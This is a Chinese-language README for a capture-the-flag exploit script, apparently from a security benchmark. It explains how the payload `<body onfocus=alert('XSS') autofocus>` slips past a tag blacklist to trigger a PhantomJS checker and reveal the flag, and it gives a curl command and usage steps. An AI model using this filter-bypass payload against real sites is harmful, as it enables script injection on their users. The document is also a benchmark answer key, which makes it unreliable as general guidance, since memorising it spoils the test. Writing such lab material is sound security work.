#+ EXP for X-050-24 (Cross 22)

本 EXP 复现了你给出的成功用法：在 `/page?name=` 中注入 `<body onfocus=alert('XSS') autofocus>`，触发后端 PhantomJS 捕获到首个弹窗文本为 `XSS`，返回包含 `FLAG{...}` 的页面。`exp.py` 会自动请求并从 HTML 中提取并打印 flag。

## 使用方法
- 一键打印 flag：
  - `python3 exp.py`
  - 默认目标顺序：`$TARGET_BASE` → `http://ip32813` → `http://127.0.0.1:5000`
- 指定目标：
  - `python3 exp.py --base http://ip32813`
  - `python3 exp.py --base http://127.0.0.1:5000`
- 本地验证（可选）：
  - 进入题目目录：`cd benchmarks/X-050-24`
  - 启动：`make build && make run`
  - 访问：`http://127.0.0.1:5000/page?name=%3Cbody%20onfocus%3Dalert(%27XSS%27)%20autofocus%3E`

## 原理说明
- 服务器对 `name` 执行黑名单：过滤除 `<body>` 外的其他标签（见 `src/app.py`）。因此可注入 `<body ...>` 并保留其属性。
- 判题（PhantomJS，见 `src/check.js`）在页面 ready 后主动对含 `[onfocus]`/`[autofocus]` 的元素分发 focus 事件；若捕获到首个弹窗文本为 `XSS`，即返回成功页面与 flag。
- 页面模板会把 `name` 的原样内容插入到 HTML 中（见 `constants.py` 的 `XSS_CONTENT_TAG`），因此 `<body onfocus=alert('XSS') autofocus>` 会被执行。

## 手工复现（curl）
- `curl 'http://ip32813/page?name=%3Cbody%20onfocus%3Dalert(%27XSS%27)%20autofocus%3E'`

## 故障排查
- 如果 `exp.py` 提示 `No flag found`：
  - 确认端口与题目实例是否对应（访问根 `/` 应见 Dalgona 界面）。
  - 远端实例可能更新了端口/路由，可用 `--base` 显式指定。
  - 本地运行前需先 `make build && make run`。

